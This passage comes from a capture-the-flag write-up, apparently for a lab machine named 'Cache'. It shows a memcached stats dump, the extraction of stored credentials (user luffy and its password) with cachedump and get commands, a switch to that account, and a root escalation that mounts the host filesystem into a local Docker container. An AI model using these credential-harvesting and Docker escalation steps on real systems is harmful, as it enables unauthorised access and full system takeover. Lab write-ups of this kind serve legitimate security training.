STAT libevent 2.1.8-stable
STAT pointer_size 64
STAT rusage_user 0.931148
STAT rusage_system 1.440963
STAT max_connections 1024
STAT curr_connections 2
STAT total_connections 208
STAT rejected_connections 0
STAT connection_structures 4
STAT reserved_fds 20
STAT cmd_get 2
STAT cmd_set 1025
STAT cmd_flush 0
STAT cmd_touch 0
STAT get_hits 2
STAT get_misses 0
STAT get_expired 0
STAT get_flushed 0
STAT delete_misses 0
STAT delete_hits 0
STAT incr_misses 0
STAT incr_hits 0
STAT decr_misses 0
STAT decr_hits 0
STAT cas_misses 0
STAT cas_hits 0
STAT cas_badval 0
STAT touch_hits 0
STAT touch_misses 0
STAT auth_cmds 0
STAT auth_errors 0
STAT bytes_read 31586
STAT bytes_written 11428
STAT limit_maxbytes 67108864
STAT accepting_conns 1
STAT listen_disabled_num 0
STAT time_in_listen_disabled_us 0
STAT threads 4
STAT conn_yields 0
STAT hash_power_level 16
STAT hash_bytes 524288
STAT hash_is_expanding 0
STAT slab_reassign_rescues 0
STAT slab_reassign_chunk_rescues 0
STAT slab_reassign_evictions_nomem 0
STAT slab_reassign_inline_reclaim 0
STAT slab_reassign_busy_items 0
STAT slab_reassign_busy_deletes 0
STAT slab_reassign_running 0
STAT slabs_moved 0
STAT lru_crawler_running 0
STAT lru_crawler_starts 5100
STAT lru_maintainer_juggles 27023
STAT malloc_fails 0
STAT log_worker_dropped 0
STAT log_worker_written 0
STAT log_watcher_skipped 0
STAT log_watcher_sent 0
STAT bytes 371
STAT curr_items 5
STAT total_items 1025
STAT slab_global_page_pool 0
STAT expired_unfetched 0
STAT evicted_unfetched 0
STAT evicted_active 0
STAT evictions 0
STAT reclaimed 0
STAT crawler_reclaimed 0
STAT crawler_items_checked 76
STAT lrutail_reflocked 0
STAT moves_to_cold 1025
STAT moves_to_warm 0
STAT moves_within_lru 0
STAT direct_reclaims 0
STAT lru_bumps_dropped 0
END

stats items
STAT items:1:number 5
STAT items:1:number_hot 0
STAT items:1:number_warm 0
STAT items:1:number_cold 5
STAT items:1:age_hot 0
STAT items:1:age_warm 0
STAT items:1:age 17
STAT items:1:evicted 0
STAT items:1:evicted_nonzero 0
STAT items:1:evicted_time 0
STAT items:1:outofmemory 0
STAT items:1:tailrepairs 0
STAT items:1:reclaimed 0
STAT items:1:expired_unfetched 0
STAT items:1:evicted_unfetched 0
STAT items:1:evicted_active 0
STAT items:1:crawler_reclaimed 0
STAT items:1:crawler_items_checked 76
STAT items:1:lrutail_reflocked 0
STAT items:1:moves_to_cold 1030
STAT items:1:moves_to_warm 0
STAT items:1:moves_within_lru 0
STAT items:1:direct_reclaims 0
STAT items:1:hits_to_hot 0
STAT items:1:hits_to_warm 0
STAT items:1:hits_to_cold 2
STAT items:1:hits_to_temp 0
END

stats items
STAT items:1:number 5
STAT items:1:number_hot 0
STAT items:1:number_warm 0
STAT items:1:number_cold 5
STAT items:1:age_hot 0
STAT items:1:age_warm 0
STAT items:1:age 17
STAT items:1:evicted 0
STAT items:1:evicted_nonzero 0
STAT items:1:evicted_time 0
STAT items:1:outofmemory 0
STAT items:1:tailrepairs 0
STAT items:1:reclaimed 0
STAT items:1:expired_unfetched 0
STAT items:1:evicted_unfetched 0
STAT items:1:evicted_active 0
STAT items:1:crawler_reclaimed 0
STAT items:1:crawler_items_checked 76
STAT items:1:lrutail_reflocked 0
STAT items:1:moves_to_cold 1030
STAT items:1:moves_to_warm 0
STAT items:1:moves_within_lru 0
STAT items:1:direct_reclaims 0
STAT items:1:hits_to_hot 0
STAT items:1:hits_to_warm 0
STAT items:1:hits_to_cold 2
STAT items:1:hits_to_temp 0
END

stats cachedump 1 0
ITEM link [21 b; 0 s]
ITEM user [5 b; 0 s]
ITEM passwd [9 b; 0 s]
ITEM file [7 b; 0 s]
ITEM account [9 b; 0 s]
END

get user
VALUE user 0 5
luffy
END

get file
VALUE file 0 7
nothing
END

get account
VALUE account 0 9
afhj556uo
END

get passwd
VALUE passwd 0 9
0n3_p1ec3
END
```
Looking back at the user's list, I can see that luffy is the user with access to Docker. I have now gained luffy's credentials of luffy:0n3_p1ec3, and can use su again to access that account.
```bash
ash@cache:/tmp$ su - luffy
su - luffy
Password: 0n3_p1ec3

luffy@cache:~$
```

### 8. Escalate privileges to root
References:
- https://fosterelli.co/privilege-escalation-via-docker
- https://www.hacknos.com/docker-privilege-escalation/
  
From here I was pretty sure that there would be a way to privesc using this account with docker access, as I saw before the daemon was running as root. The first reference describes a technique that basically outlines a single command that can be used to get a root shell. However, the command that is given there won't work because it requires an external container. Luckily this just means we need to use a container that is local to the machine.
```bash
luffy@cache:~$ docker ps -a
docker ps -a
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                        PORTS               NAMES
a8c756148935        ubuntu              "/bin/bash"         2 minutes ago       Exited (127) 51 seconds ago                       agitated_payne
e59434e829e5        ubuntu              "bash"              6 minutes ago       Up 6 minutes                                      focused_tharp
```
It can be seen here that there is a local ubuntu container, which is perfect. We can launch the container, mount the main filesystem and then interact with it as root.
```bash
luffy@cache:~$ docker run -it -v /:/mnt ubuntu     
docker run -it -v /:/mnt ubuntu
root@a8c756148935:/# cd /mnt
cd /mnt
root@a8c756148935:/mnt# whoami
whoami
root
```